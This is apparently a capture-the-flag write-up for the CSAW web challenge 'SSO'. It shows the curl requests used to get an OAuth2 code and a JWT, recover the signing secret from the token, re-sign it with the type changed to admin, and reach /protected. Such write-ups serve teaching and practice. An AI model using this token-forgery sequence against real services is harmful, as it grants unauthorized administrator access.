# SSO - Web

> Don’t you love undocumented APIs
> Be the admin you were always meant to be

In this challenge, we have a webpage that got this information in the source code

```
<h1>Welcome to our SINGLE SIGN ON PAGE WITH FULL OAUTH2.0!</h1>
<a href="/protected">.</a>
<!--
Wish we had an automatic GET route for /authorize... well they'll just have to POST from their own clients I guess
POST /oauth2/token
POST /oauth2/authorize form-data TODO: make a form for this route
--!>
```

Here we have to exploit the OAuth2.0 protocol. After reading the documentation, we need to have some specific parameters in our request. The first request we make is this one

> curl -d "response_type=code&redirect_uri=xxxx" http://web.chal.csaw.io:9000/oauth2/authorize

This will make a request to /authorize which will give us the auth code. The response we get is the following:

```
Redirecting to <a href="xxxx?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJ4eHh4IiwiaWF0IjoxNTM3MDQyNDI3LCJleHAiOjE1MzcwNDMwMjd9.wlUbFkuep3-tf_QNersLq_wa4nnsJ6aBVXa208MDdfE&amp;state=">xxxx?code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJ4eHh4IiwiaWF0IjoxNTM3MDQy> NDI3LCJleHAiOjE1MzcwNDMwMjd9.wlUbFkuep3-tf_QNersLq_wa4nnsJ6aBVXa208MDdfE&amp;state=</a>.
```

Then once you have the auth code, you send a request to /token to get the token:

> curl -X POST -d "grant_type=authorization_code&code=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyZWRpcmVjdF91cmkiOiJ4eHh4IiwiaWF0IjoxNTM3MDQyNDI3LCJleHAi>OjE1MzcwNDMwMjd9.wlUbFkuep3-tf_QNersLq_wa4nnsJ6aBVXa208MDdfE&redirect_uri=xxxx" http://web.chal.csaw.io:9000/oauth2/token

The grant_type parameter comes from the documentation which is required when you make a request to /token. After running that, we get our token

```
{"token_type":"Bearer","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoidXNlciIsInNlY3JldCI6InVmb3VuZG1lISIsImlhdCI6MTUzNzA0MjQ2NywiZXhwIjoxNTM3MDQzMDY3fQ.KWdaQk-lXliHTR0GqCOdnCzfLA478decjITQAokBogk"}
```

This is a JWT web token so we can go to https://jwt.io/ and change the type from user to admin so it looks like this:

![jwt](https://puu.sh/BwAfZ/7c3c4bf322.png)

The last step we need to do on the jwt.io page is to the sign the cookie with the secret "ufoundme!":

![signjwt](https://puu.sh/BwAhC/2b245eef52.png)

Then the page updates the new token which we use to send a request to /protected since we now have an admin cookie. Therfore, the final requests that gave us the flag is the following:

> curl -H "Authorization: Bearer eyJhbGciOiJIUzI.eyJ0eXBlIjoiYWRtaW4iLCJzZWNyZXQiOiJ1Zm91bmRtZSEiLCJpYXQiOjE1MzcwNDI0NjcsImV4cCI6MTUzNzA0MzA2N30.eIbd4h>ZyU3J_jF7aXCT5JpJKDbVzjHB_coq1DFgw-8Q" http://web.chal.csaw.io:9000/protected

flag{JsonWebTokensaretheeasieststorage-lessdataoptiononthemarket!theyrelyonsupersecureblockchainlevelencryptionfortheirmethods}